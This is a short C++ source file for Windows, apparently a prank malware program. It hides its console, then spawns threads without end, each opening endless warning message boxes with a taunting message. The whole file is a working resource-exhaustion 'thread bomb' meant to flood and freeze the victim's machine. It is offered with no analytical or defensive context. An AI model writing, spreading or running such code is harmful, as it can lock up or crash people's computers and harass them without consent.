
// Author: Dashie
// Version: 1.0


#include <windows.h>

#include <iostream>
#include <thread>
#include <vector>
#include <string>


using namespace std;

vector<thread> threads = { };

const LPCSTR message = "Hey, you have been fuked!";
const LPCSTR title = "Dash Society loves you ;3";

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    Sleep(3000);

    while (true)
    {
        threads.push_back(thread(
            []()
            {
                while (true)
                {
                    threads.push_back(thread(
                        []()
                        {
                            while (true)
                            {
                                MessageBox(NULL, message, title, MB_OK | MB_ICONWARNING);
                            };
                        }
                    ));
                };
            }
        ));
    };

    for (thread &t : threads)
    {
        t.join();
    };
};
